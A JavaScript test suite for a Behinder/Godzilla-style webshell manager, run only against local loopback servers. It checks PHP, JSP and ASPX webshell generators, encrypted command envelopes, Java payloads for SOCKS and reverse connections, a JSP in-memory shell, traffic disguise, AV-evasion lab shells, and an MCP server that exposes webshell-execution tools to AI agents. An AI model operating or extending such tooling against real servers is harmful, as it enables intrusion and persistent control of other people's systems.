// dsh-webshell-mgr 测试套件：
//   1) 离线单测：命令翻译（引号/解析）、AES 信封自洽、store CRUD、插件清单校验、
//      生成器产物、extractMarked
//   2) MCP 握手：spawn mcp/server.mjs 走 initialize/tools/list JSON-RPC
//   3) PHP 回路烟测（本机有 php 时执行）：生成器产出三类马 + av-lab 两匹魔改马挂
//      php -S 回路 detect→exec→文件→数据库→插件全链路
// 运行：node test/run.mjs

import { execFileSync, spawn } from "node:child_process";
import { mkdtempSync, writeFileSync, mkdirSync, existsSync, rmSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { createCipheriv, createDecipheriv } from "node:crypto";
import http from "node:http";

const PKG = dirname(dirname(fileURLToPath(import.meta.url)));

const results = { pass: 0, fail: 0, skip: 0 };
async function ok(name, fn) {
	try { await fn(); results.pass++; console.log(`  ok   ${name}`); }
	catch (e) { results.fail++; console.log(`  FAIL ${name}\n       ${e?.stack ?? e}`); }
}
function skip(name, why) { results.skip++; console.log(`  skip ${name}（${why}）`); }

function phpAvailable() {
	try { execFileSync("php", ["-v"], { stdio: "ignore" }); return true; } catch { return false; }
}

//#region 1. 命令翻译层

import * as cb from "../lib/protocol/command-build.js";

await ok("quotePosix 单引号转义", () => {
	if (cb.quotePosix("it's") !== "'it'\\''s'") throw new Error(cb.quotePosix("it's"));
	if (cb.quotePosix("a b") !== "'a b'") throw new Error("plain");
});

await ok("quoteCmd / quotePs 转义", () => {
	if (cb.quoteCmd('a"b') !== '"a""b"') throw new Error("cmd");
	if (cb.quotePs("c:\\x'y") !== "'c:\\x''y'") throw new Error("ps");
});

await ok("parseOsProbe：Windows_NT / 字面量", () => {
	if (cb.parseOsProbe(":WSMPROBE-Windows_NT-END:") !== "windows") throw new Error("win");
	if (cb.parseOsProbe(":WSMPROBE-%OS%-END:\n") !== "linux") throw new Error("linux");
	if (cb.parseOsProbe("nothing") !== null) throw new Error("null");
});

await ok("parseLs：long-iso 与月份双格式", () => {
	const rows = cb.parseLs([
		"total 8",
		"drwxr-xr-x  2 www www 4096 2026-08-21 10:22 dir1",
		"-rw-r--r--  1 u   g     12 Aug 21 10:22 file with space.txt"
	].join("\n"));
	if (rows.length !== 2) throw new Error(`rows=${rows.length}`);
	if (rows[0].name !== "dir1" || !rows[0].isDir) throw new Error("dir1");
	if (rows[1].name !== "file with space.txt" || rows[1].size !== 12) throw new Error("file");
});

await ok("parseDir：windows 目录/文件/表头跳过", () => {
	const rows = cb.parseDir([
		" Volume in drive C has no label.",
		" Directory of C:\\www",
		"08/21/2026  10:22 AM    <DIR>          .",
		"08/21/2026  10:22 AM    <DIR>          ..",
		"08/21/2026  10:23 AM    <DIR>          sub",
		"08/21/2026  10:24 AM            12,345 data.bin",
		"               1 File(s)         12,345 bytes"
	].join("\r\n"));
	if (rows.length !== 2) throw new Error(`rows=${rows.length}`);
	if (rows[0].name !== "sub" || !rows[0].isDir) throw new Error("sub");
	if (rows[1].name !== "data.bin" || rows[1].size !== 12345) throw new Error("bin");
});

await ok("cleanB64Output：certutil 头尾剥离", () => {
	const out = cb.cleanB64Output("-----BEGIN CERTIFICATE-----\nQUJD\nRVBG==\n-----END CERTIFICATE-----\nCertUtil: -encode command completed successfully.");
	if (out !== "QUJDRVBG==") throw new Error(out);
});

await ok("buildFileCommand：动作映射", () => {
	if (!cb.buildFileCommand("ls", { path: "/t" }, "linux").includes("ls -la")) throw new Error("ls");
	if (!cb.buildFileCommand("read", { path: "C:/t" }, "windows").includes("certutil")) throw new Error("read-win");
	if (!cb.buildFileCommand("write-first", { path: "/t", b64: "QUJD" }, "linux").includes("base64 -d >")) throw new Error("write");
});

//#endregion

//#region 2. AES 信封自洽（Node 双端模拟 PHP openssl 语义）

await ok("dsh-aes 信封：加解密往返 + PKCS7 与 openssl 语义一致", async () => {
	const { sendOp } = await import("../lib/protocol/dsh-aes.js");
	// 模拟马侧：截获 X-T 与 body，用标准 AES-128-CBC + PKCS7 解密（= PHP openssl RAW_DATA 语义）
	let captured = null;
	const srv = http.createServer((req, res) => {
		const chunks = [];
		req.on("data", (c) => chunks.push(c));
		req.on("end", () => {
			const xt = Buffer.from(req.headers["x-t"], "base64");
			const iv = xt.subarray(0, 16), key = xt.subarray(16);
			const ct = Buffer.from(Buffer.concat(chunks).toString("utf8"), "base64");
			const dec = createDecipheriv("aes-128-cbc", key, iv);
			const pt = Buffer.concat([dec.update(ct), dec.final()]).toString("utf8");
			captured = pt;
			const out = pt === "c" + "echo HELLO" ? "HELLO" : "";
			res.setHeader("content-type", "application/json");
			res.end(JSON.stringify({ code: 0, data: Buffer.from(out).toString("base64") }));
		});
	});
	await new Promise((r) => srv.listen(0, "127.0.0.1", r));
	const port = srv.address().port;
	const out = await sendOp({ url: `http://127.0.0.1:${port}/x.php`, timeoutMs: 3000 }, "c" + "echo HELLO");
	if (captured !== "cecho HELLO") throw new Error(`captured=${captured}`);
	if (out.toString("utf8") !== "HELLO") throw new Error(`out=${out}`);
	srv.close();
});

//#endregion

//#region 2b. Java 载荷管线（behinder-java：常量池补丁 + 线协议自洽）

import { patchClass, readFieldValues, classNameOf } from "../lib/protocol/javapatch.js";
import { JAVA_PAYLOADS } from "../lib/protocol/payloads-java.js";
import { decodeSeg } from "../lib/protocol/dsh-mem.js";

await ok("javapatch：五载荷嵌入 + 补丁/改名往返 + 未知字段报错", () => {
	for (const name of ["WsmProbe", "WsmCmd", "WsmList", "WsmRead", "WsmWrite"]) {
		if (!JAVA_PAYLOADS[name]) throw new Error(`缺载荷 ${name}`);
		const orig = Buffer.from(JAVA_PAYLOADS[name], "base64");
		const vals = readFieldValues(orig);
		if (!Object.keys(vals).length) throw new Error(`${name} 无 ConstantValue 字段`);
		const patched = patchClass(orig, Object.fromEntries(Object.entries(vals).map(([k]) => [k, "V-" + k])), "x/Rnd" + name);
		if (classNameOf(patched) !== "x/Rnd" + name) throw new Error(`${name} 类名未改`);
		for (const [k] of Object.entries(vals)) {
			if (readFieldValues(patched)[k] !== "V-" + k) throw new Error(`${name}.${k} 补丁未生效`);
		}
	}
	let threw = false;
	try { patchClass(Buffer.from(JAVA_PAYLOADS.WsmCmd, "base64"), { nope: "x" }); } catch { threw = true; }
	if (!threw) throw new Error("未知字段应报错");
});

await ok("behinder-java 线协议：加密信封经模拟马侧解出已补丁 class", async () => {
	const { sendJavaPayload } = await import("../lib/protocol/behinder-java.js");
	const { md5hex, b64 } = await import("../lib/protocol/http-client.js");
	const password = "wiretest1";
	let verdict = null;
	const srv = http.createServer((req, res) => {
		const chunks = [];
		req.on("data", (c) => chunks.push(c));
		req.on("end", () => {
			if (req.method !== "POST" || req.headers["x-t"] !== "1") { res.statusCode = 400; res.end(); return; }
			// 模拟冰蝎型 JSP 马侧：b64 → AES-ECB 解密 → 得 class 字节 → 解析字段回显
			const key = Buffer.from(md5hex(password).slice(0, 16));
			const d = createDecipheriv("aes-128-ecb", key, null);
			const cls = Buffer.concat([d.update(Buffer.from(Buffer.concat(chunks).toString("utf8"), "base64")), d.final()]);
			verdict = { class: classNameOf(cls), fields: readFieldValues(cls) };
			res.setHeader("content-type", "text/plain");
			res.end("WSM1|TOKEN|Mac_OS_X|u|h|d|1.8.0|8|/webroot");
		});
	});
	await new Promise((r) => srv.listen(0, "127.0.0.1", r));
	const out = await sendJavaPayload({ url: `http://127.0.0.1:${srv.address().port}/shell.jsp`, password, timeoutMs: 3000 }, "WsmProbe", { t: "TOKEN" });
	if (!out.startsWith("WSM1|TOKEN")) throw new Error(`out=${out}`);
	if (!verdict.class.startsWith("x/")) throw new Error(`类名未随机化：${verdict.class}`);
	if (verdict.fields.t !== "TOKEN") throw new Error(`字段补丁未达马侧：${JSON.stringify(verdict.fields)}`);
	srv.close();
});

await ok("生成器：jsp-behinder 密钥派生 + jsp-mem-filter 注入特征", async () => {
	const { generate } = await import("../lib/generators.js");
	const { createHash } = await import("node:crypto");
	const pass = "genpass1";
	const key = createHash("md5").update(pass).digest("hex").slice(0, 16);
	const b = generate("jsp-behinder", { password: pass });
	if (!b.content.includes(`"${key}"`)) throw new Error("冰蝎型 JSP 未嵌 md5 派生 key");
	if (!b.content.includes("defineClass") || !b.content.includes("equals(pageContext)")) throw new Error("defineClass 契约缺失");
	const m = generate("jsp-mem-filter", { password: pass });
	for (const feat of ["X-T", "MEMSHELL-OK", "getDeclaredField(\"context\")", "addURLPattern", key]) {
		if (!m.content.includes(feat)) throw new Error(`内存马引导器缺特征 ${feat}`);
	}
});

await ok("dsh-mem 回显段解码：b64 段解码 + 原文段直通", () => {
	if (decodeSeg(Buffer.from("whoami-out").toString("base64")) !== "whoami-out") throw new Error("b64 段");
	if (decodeSeg("sh: command not found") !== "sh: command not found") throw new Error("原文段");
	if (decodeSeg("") !== "") throw new Error("空段");
});

//#endregion

//#region 2c. 编译载荷通道向量（godzilla-java 序列化 / 新载荷嵌入 / 生成器特征）

import { serializeParams, parseParams } from "../lib/protocol/godzilla-java.js";
import { ASPX_PAYLOADS } from "../lib/protocol/payloads-aspx.js";

await ok("godzilla-java：Parameter 序列化往返 + 二进制值", () => {
	const obj = { methodName: "cmd", c: "whoami; echo '它'", d: "", bin: Buffer.from([0, 1, 2, 0xff, 0x02]) };
	const buf = serializeParams(obj);
	const back = parseParams(buf);
	if (back.methodName.toString("utf8") !== "cmd") throw new Error("methodName");
	if (back.c.toString("utf8") !== "whoami; echo '它'") throw new Error("中文值");
	if (!back.bin.equals(obj.bin)) throw new Error("二进制值（含 0x02 分隔符字节）");
});

await ok("载荷族嵌入：WsmG/WsmDb/WsmMemUnload/U 均在", () => {
	for (const n of ["WsmG", "WsmDb", "WsmMemUnload"]) {
		const raw = Buffer.from(JAVA_PAYLOADS[n], "base64");
		if (raw.length < 500) throw new Error(`${n} 过小`);
		readFieldValues(raw); // 可解析
	}
	if (!ASPX_PAYLOADS.U || Buffer.from(ASPX_PAYLOADS.U, "base64").length < 3000) throw new Error("U.dll 缺失");
});

await ok("生成器编译载荷特征：jsp-godzilla 标记 + aspx-behinder 契约", async () => {
	const { generate } = await import("../lib/generators.js");
	const { createHash } = await import("node:crypto");
	const md5 = (x) => createHash("md5").update(x).digest("hex");
	const g = generate("jsp-godzilla", { password: "pass", secretKey: "sk" });
	const key = md5("sk").slice(0, 16);
	// md5 标记是马侧运行时算的——产物只需含 m5 调用 + 密钥组件
	if (!g.content.includes('m5("pass" + "' + key + '")')) throw new Error("md5 标记计算缺失");
	if (!g.content.includes(key)) throw new Error("xc 密钥缺失");
	if (!g.content.includes("parameters")) throw new Error("parameters 契约缺失");
	const a = generate("aspx-behinder", { password: "p1" });
	for (const f of ['CreateInstance("U")', "BinaryRead", "ECB", md5("p1").slice(0, 16)]) {
		if (!a.content.includes(f)) throw new Error(`aspx 缺特征 ${f}`);
	}
});

//#endregion

//#region 2d. 流量伪装与网络载荷向量（profile 整形 / 网络载荷嵌入）

import { shapeHeaders, stripResponse, validateProfile } from "../lib/protocol/profile.js";

await ok("profile：UA 轮换 + 显式头优先 + 剖离 + 校验", () => {
	const conn = { id: "tp", profile_json: '{"uas":["A1","A2"],"headers":{"X-T2":"v"},"strip":["<<",">>"]}' };
	const h1 = shapeHeaders(conn, { "content-type": "text/plain" });
	const h2 = shapeHeaders(conn, { "content-type": "text/plain" });
	if (h1["User-Agent"] !== "A1" || h2["User-Agent"] !== "A2") throw new Error("UA 轮换");
	if (h1["User-Agent"] !== "A1") throw new Error("首轮 UA");
	const h3 = shapeHeaders(conn, { "User-Agent": "explicit" });
	if (h3["User-Agent"] !== "explicit") throw new Error("显式优先");
	if (h1["X-T2"] !== "v" || h1["content-type"] !== "text/plain") throw new Error("附加头/保留原头");
	if (stripResponse(conn, "<<data>>") !== "data") throw new Error("剖离");
	if (stripResponse({ id: "x" }, "raw") !== "raw") throw new Error("无 profile 直通");
	if (!validateProfile(conn.profile_json).ok) throw new Error("合法 profile 被拒");
	if (validateProfile("bad{").ok) throw new Error("非法 profile 放行");
});

await ok("网络载荷族嵌入：Socks/Fwd/Reverse/Zip/EnumDb/Shot 单类可补丁", () => {
	for (const n of ["WsmSocks", "WsmFwd", "WsmReverse", "WsmZip", "WsmEnumDb", "WsmShot"]) {
		const raw = Buffer.from(JAVA_PAYLOADS[n], "base64");
		const vals = readFieldValues(raw);
		patchClass(raw, Object.fromEntries(Object.entries(vals).map(([k]) => [k, "v"])), "x/N" + n);
	}
	// lambda 载荷无内部类（编译期单文件交付的前提）
	for (const n of ["WsmSocks", "WsmFwd", "WsmReverse"]) {
		if (!JAVA_PAYLOADS["Wsm" + n.slice(3)]) throw new Error(`${n} 缺失`);
	}
});

//#endregion

//#region 3. snippets

import * as sn from "../lib/protocol/snippets.js";

await ok("extractMarked：WSMJSON / WSMB64 / 原文", () => {
	const j = sn.extractMarked('noise{"ok":true}WSMJSON{"a":1}');
	if (j.a !== 1) throw new Error("json");
	const b = sn.extractMarked("WSMB64QUJD");
	if (b.b64buffer !== "QUJD") throw new Error("b64");
	const t = sn.extractMarked("plain");
	if (t.text !== "plain") throw new Error("text");
});

await ok("phpLs 片段：参数 base64 内嵌", () => {
	const code = sn.phpLs("/var/tmp/x'y");
	if (!code.includes("base64_decode('")) throw new Error("b64 embed");
	if (code.includes("/var/tmp/x'y")) throw new Error("原文泄漏进片段（转义缺失）");
});

//#endregion

//#region 4. store

import { openStore, saveConn, listConns, getConn, deleteConn, saveDbProfile, listDbProfiles, logOp, listOps } from "../lib/store.js";

await ok("store：连接 CRUD + 档案 + op_log", () => {
	const st = openStore(":memory:");
	const c = saveConn(st, { name: "t1", url: "http://a/b.php", protocol: "dsh-aes" });
	if (!getConn(st, c.id)) throw new Error("get");
	if (listConns(st).length !== 1) throw new Error("list");
	saveConn(st, { id: c.id, name: "t2" });
	if (getConn(st, c.id).name !== "t2") throw new Error("update 沿用未提交字段");
	const p = saveDbProfile(st, c.id, { type: "sqlite", database: "/tmp/x.db" });
	if (listDbProfiles(st, c.id).length !== 1 || !p.id) throw new Error("profile");
	logOp(st, c.id, "exec", "id");
	if (listOps(st, c.id).length !== 1) throw new Error("op");
	deleteConn(st, c.id);
	if (listConns(st).length !== 0 || listDbProfiles(st, c.id).length !== 0) throw new Error("cascade delete");
});

//#endregion

//#region 5. 生成器

import { GEN_KINDS, makeAndSave, generate } from "../lib/generators.js";

await ok("生成器：8 类产物非空且特征正确", () => {
	const tmp = mkdtempSync(join(tmpdir(), "wsm-gen-"));
	for (const kind of Object.keys(GEN_KINDS)) {
		const item = makeAndSave(tmp, kind, { password: "pw123", name: "t-" + kind });
		if (!item.content || item.content.length < 30) throw new Error(`${kind} 内容异常`);
		if (!existsSync(item.filePath)) throw new Error(`${kind} 未落盘`);
	}
	const aes2 = generate("php-aes2", {});
	if (!aes2.content.includes("case 'e'")) throw new Error("v2 缺 e 操作码");
	const aes1 = generate("php-aes1", {});
	if (aes1.content.includes("case 'e'")) throw new Error("v1 不应含 e");
	const one = generate("php-oneliner", { passParam: "zz" });
	if (!one.content.includes("$_POST['zz']")) throw new Error("oneliner 参数名");
	rmSync(tmp, { recursive: true, force: true });
});

//#endregion

//#region 6. 插件注册表

import { listPlugins, renderPayload, getPlugin } from "../lib/plugins-registry.js";

await ok("插件注册表：示例发现 + 清单校验 + 占位渲染", () => {
	const plugins = listPlugins(join(tmpdir(), "wsm-none"));
	const names = plugins.map((p) => p.name);
	if (!names.includes("sysinfo") || !names.includes("portscan")) throw new Error(`示例缺失：${names}`);
	const ps = getPlugin(join(tmpdir(), "wsm-none"), "portscan");
	if (!ps.params.some((p) => p.key === "host")) throw new Error("参数表");
	const code = renderPayload(ps, { host: "127.0.0.1", ports: "80", timeout: "1" });
	const hostB64 = Buffer.from("127.0.0.1").toString("base64");
	if (!code.includes("base64_decode('" + hostB64 + "')")) throw new Error("host 未按 b64 形态渲染");
	if (/\{\{/.test(code)) throw new Error("占位符残留");
});

//#endregion

//#region 7. MCP 握手

await ok("MCP server：initialize + tools/list 八件工具", async () => {
	const home = mkdtempSync(join(tmpdir(), "wsm-mcp-"));
	const child = spawn(process.execPath, [join(PKG, "mcp", "server.mjs")], {
		env: { ...process.env, HOME: home }, stdio: ["pipe", "pipe", "pipe"]
	});
	let buf = "";
	const pending = [];
	child.stdout.on("data", (d) => {
		buf += d.toString("utf8");
		let i;
		while ((i = buf.indexOf("\n")) >= 0) {
			const line = buf.slice(0, i); buf = buf.slice(i + 1);
			if (!line.trim()) continue;
			try { pending.shift()?.(JSON.parse(line)); } catch { /* 非 JSON 行忽略 */ }
		}
	});
	const send = (obj) => new Promise((resolve) => { pending.push(resolve); child.stdin.write(JSON.stringify(obj) + "\n"); });
	const init = await send({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18" } });
	if (init.result?.serverInfo?.name !== "dsh-webshell-mgr") throw new Error("init");
	const list = await send({ jsonrpc: "2.0", id: 2, method: "tools/list" });
	const toolNames = list.result.tools.map((t) => t.name);
	for (const expect of ["webshell_connect", "webshell_exec", "webshell_file", "webshell_db", "webshell_plugin_list", "webshell_plugin_run", "webshell_generate", "webshell_list"]) {
		if (!toolNames.includes(expect)) throw new Error(`缺工具 ${expect}`);
	}
	child.kill();
	rmSync(home, { recursive: true, force: true });
});

//#endregion

//#region 8. PHP 回路烟测

if (phpAvailable()) {
	const tmp = mkdtempSync(join(tmpdir(), "wsm-php-"));
	mkdirSync(join(tmp, "shells"));

	// 现场产出三类自研马（写入被服务目录）
	const shells = join(tmp, "shells");
	writeFileSync(join(shells, "one.php"), generate("php-oneliner", { passParam: "x" }).content);
	writeFileSync(join(shells, "basic.php"), generate("php-basic", { passParam: "gate", cmdParam: "do", password: "pw-basic" }).content);
	writeFileSync(join(shells, "aes2.php"), generate("php-aes2", {}).content);
	writeFileSync(join(shells, "beh.php"), generate("php-behinder", { password: "pw-beh" }).content);
	writeFileSync(join(shells, "god.php"), generate("php-godzilla", { passParam: "gk", secretKey: "sk-123" }).content);
	// av-lab 两匹魔改马（协议互通回路）
	const lab = join(PKG, "..", "..", "modes", "av-evasion", "lab", "10-webshell-managers");
	for (const [src, dst] of [[join(lab, "behinder", "modified-shell.php"), "bmod.php"], [join(lab, "godzilla", "php-payload-demo.php"), "gmod.php"]]) {
		if (existsSync(src)) writeFileSync(join(shells, dst), readFileSync(src));
	}
	// sqlite 测试库
	const { DatabaseSync } = await import("node:sqlite");
	const sdb = new DatabaseSync(join(tmp, "test.db"));
	sdb.exec("CREATE TABLE t(id INTEGER, name TEXT); INSERT INTO t VALUES (1,'alpha'),(2,'beta');");
	sdb.close();

	const php = spawn("php", ["-S", "127.0.0.1:0"], { cwd: shells, stdio: ["ignore", "ignore", "pipe"] });
	let phpPort = 0;
	await new Promise((resolve) => {
		php.stderr.on("data", (d) => {
			const m = /127\.0\.0\.1:(\d+)/.exec(String(d));
			if (m && !phpPort) { phpPort = Number(m[1]); resolve(); }
		});
		setTimeout(() => resolve(), 3000);
	});

	if (!phpPort) {
		skip("PHP 回路烟测", "php -S 未就绪");
	} else {
		const U = (p) => `http://127.0.0.1:${phpPort}/${p}`;
		const { detectProtocol } = await import("../lib/protocol/registry.js");
		const cap = await import("../lib/protocol/capabilities.js");
		const mkConn = (over) => Object.assign({ id: "t", method: "post", encoding: "auto", shell_lang: "php", pass_param: "x", cmd_param: "cmd", timeoutMs: 8000, headers: {} }, over);

		await ok("PHP 回路：一句话 eval 马——识别 + exec + 结构化 ls + 二进制读写", async () => {
			const r = await detectProtocol({ url: U("one.php"), password: "", passParam: "x" });
			if (!r.hit || r.protocol !== "cmd-eval") throw new Error(JSON.stringify(r).slice(0, 400));
			const conn = mkConn({ url: U("one.php"), protocol: "cmd-eval" });
			const out = await cap.runCommand(conn, "echo PHPALIVE");
			if (!out.includes("PHPALIVE")) throw new Error(String(out).slice(0, 200));
			const entries = await cap.listDir(conn, join(tmp, "shells"));
			if (!entries.some((e) => e.name === "one.php")) throw new Error(JSON.stringify(entries).slice(0, 200));
			const bin = Buffer.from([0, 1, 2, 253, 254, 255, 10, 13, 0, 7]);
			await cap.writeFile(conn, join(tmp, "shells", "bin-eval.dat"), bin);
			const back = await cap.readFile(conn, join(tmp, "shells", "bin-eval.dat"));
			if (!back.equals(bin)) throw new Error(`二进制往返不一致（${back.length} vs ${bin.length}）`);
		});

		await ok("PHP 回路：基础马（口令门+命令通道）——识别 + 命令翻译文件操作", async () => {
			const r = await detectProtocol({ url: U("basic.php"), password: "pw-basic", passParam: "gate", cmdParam: "do" });
			if (!r.hit || r.protocol !== "cmd-system") throw new Error(JSON.stringify(r).slice(0, 400));
			const conn = mkConn({ url: U("basic.php"), protocol: "cmd-system", password: "pw-basic", pass_param: "gate", cmd_param: "do" });
			const out = await cap.runCommand(conn, "echo BASICOK");
			if (!out.includes("BASICOK")) throw new Error(String(out).slice(0, 200));
			const bin = Buffer.alloc(30000);
			for (let i = 0; i < bin.length; i++) bin[i] = (i * 7 + 3) & 0xff;
			await cap.writeFile(conn, join(tmp, "shells", "bin-cmd.dat"), bin); // 走 base64 分块命令
			const back = await cap.readFile(conn, join(tmp, "shells", "bin-cmd.dat"));
			if (!back.equals(bin)) throw new Error(`分块写读不一致（${back.length}）`);
			const entries = await cap.listDir(conn, join(tmp, "shells"));
			if (!entries.some((e) => e.name === "bin-cmd.dat")) throw new Error("ls 解析缺文件");
		});

		await ok("PHP 回路：自研加密马 v2——识别 + 原生 u/d 读写 + eval 片段", async () => {
			const r = await detectProtocol({ url: U("aes2.php"), password: "" });
			if (!r.hit || r.protocol !== "dsh-aes") throw new Error(JSON.stringify(r).slice(0, 400));
			const conn = mkConn({ url: U("aes2.php"), protocol: "dsh-aes" });
			const out = await cap.runCommand(conn, "echo AESOK");
			if (!out.includes("AESOK")) throw new Error(String(out).slice(0, 200));
			const bin = Buffer.from("binary-\x00\xff\x80-safe");
			await cap.writeFile(conn, join(tmp, "shells", "bin-aes.dat"), bin);
			const back = await cap.readFile(conn, join(tmp, "shells", "bin-aes.dat"));
			if (!back.equals(bin)) throw new Error("原生 u/d 读写不一致");
			const entries = await cap.listDir(conn, join(tmp, "shells")); // 经 e 操作码结构化
			if (!entries.some((e) => e.name === "bin-aes.dat")) throw new Error("eval ls 缺文件");
		});

		await ok("PHP 回路：冰蝎型形态马——识别 + 桥接 eval + 结构化 ls", async () => {
			const r = await detectProtocol({ url: U("beh.php"), password: "pw-beh" });
			if (!r.hit || r.protocol !== "behinder") throw new Error(JSON.stringify(r).slice(0, 400));
			const conn = mkConn({ url: U("beh.php"), protocol: "behinder", password: "pw-beh" });
			const out = await cap.runCommand(conn, "echo BEHOK");
			if (!out.includes("BEHOK")) throw new Error(String(out).slice(0, 200));
			const entries = await cap.listDir(conn, join(tmp, "shells"));
			if (!entries.some((e) => e.name === "beh.php")) throw new Error("结构化 ls 缺文件");
		});

		await ok("PHP 回路：哥斯拉型形态马——识别 + 桥接 eval + 数据库", async () => {
			const r = await detectProtocol({ url: U("god.php"), password: "gk", secretKey: "sk-123" });
			if (!r.hit || r.protocol !== "godzilla") throw new Error(JSON.stringify(r).slice(0, 400));
			const conn = mkConn({ url: U("god.php"), protocol: "godzilla", password: "gk", secret_key: "sk-123" });
			const out = await cap.runCommand(conn, "echo GODOK");
			if (!out.includes("GODOK")) throw new Error(String(out).slice(0, 200));
			const profile = { type: "sqlite", host: "", port: 0, username: "", password: "", database: join(tmp, "test.db") };
			const q = await cap.dbQuery(conn, profile, "SELECT COUNT(*) AS n FROM t");
			if (!q.rows || q.rows[0][0] !== "2") throw new Error(JSON.stringify(q).slice(0, 300));
		});

		if (existsSync(join(tmp, "shells", "bmod.php"))) {
			await ok("PHP 回路：魔改冰蝎型马——识别 + 命令执行（与 av-lab 马字节级互通）", async () => {
				// php -S 单线程时序怪癖容错：协商型协议偶发响应错乱——重试三轮（每轮新会话）
				let last = "";
				for (let attempt = 0; attempt < 3; attempt++) {
					const r = await detectProtocol({ url: U("bmod.php"), password: "sess-abc", secretKey: "x9k2" });
					if (!r.hit || r.protocol !== "behinder-mod") throw new Error(JSON.stringify(r).slice(0, 400));
					const conn = mkConn({ url: U("bmod.php"), protocol: "behinder-mod", password: "sess-abc", secret_key: "x9k2", id: "t-bmod-" + attempt });
					const out = await cap.runCommand(conn, "echo BMODOK");
					if (out.includes("BMODOK")) return;
					last = String(out).slice(0, 200);
				}
				throw new Error(last);
			});
		} else skip("PHP 回路：魔改冰蝎", "av-lab 马文件不可达");

		if (existsSync(join(tmp, "shells", "gmod.php"))) {
			await ok("PHP 回路：魔改哥斯拉型马——识别 + 命令执行（md5 校验回传）", async () => {
				// 同上：php -S 时序容错三轮
				let last = "";
				for (let attempt = 0; attempt < 3; attempt++) {
					const r = await detectProtocol({ url: U("gmod.php"), password: "xg-123", secretKey: "g7#m" });
					if (!r.hit || r.protocol !== "godzilla-mod") throw new Error(JSON.stringify(r).slice(0, 400));
					const conn = mkConn({ url: U("gmod.php"), protocol: "godzilla-mod", password: "xg-123", secret_key: "g7#m", id: "t-gmod-" + attempt });
					const out = await cap.runCommand(conn, "echo GMODOK");
					if (out.includes("GMODOK")) return;
					last = String(out).slice(0, 200);
				}
				throw new Error(last);
			});
		} else skip("PHP 回路：魔改哥斯拉", "av-lab 马文件不可达");

		await ok("PHP 回路：数据库（sqlite PDO 全链路）", async () => {
			const conn = mkConn({ url: U("aes2.php"), protocol: "dsh-aes" });
			const profile = { type: "sqlite", host: "", port: 0, username: "", password: "", database: join(tmp, "test.db") };
			const r = await cap.dbQuery(conn, profile, "SELECT id, name FROM t ORDER BY id");
			if (!r.cols || r.cols.join(",") !== "id,name") throw new Error(JSON.stringify(r).slice(0, 300));
			if (JSON.stringify(r.rows) !== JSON.stringify([["1", "alpha"], ["2", "beta"]])) throw new Error(JSON.stringify(r.rows));
		});

		await ok("PHP 回路：载荷插件（sysinfo + portscan 经 eval 通道）", async () => {
			const userDir = join(tmpdir(), "wsm-none");
			const { runPlugin, getPlugin: gp } = await import("../lib/plugins-registry.js");
			const conn = mkConn({ url: U("one.php"), protocol: "cmd-eval" });
			const r1 = await runPlugin(conn, gp(userDir, "sysinfo"), {});
			if (!r1 || !r1.php) throw new Error(JSON.stringify(r1).slice(0, 300));
			const r2 = await runPlugin(conn, gp(userDir, "portscan"), { host: "127.0.0.1", ports: String(phpPort), timeout: "2" });
			if (!r2 || !Array.isArray(r2.open) || !r2.open.includes(phpPort)) throw new Error(JSON.stringify(r2).slice(0, 300));
		});
	}
	php.kill();
	rmSync(tmp, { recursive: true, force: true });
} else {
	skip("PHP 回路烟测", "本机无 php");
}

//#endregion

console.log(`\n结果：${results.pass} 通过 / ${results.fail} 失败 / ${results.skip} 跳过`);
process.exit(results.fail ? 1 : 0);
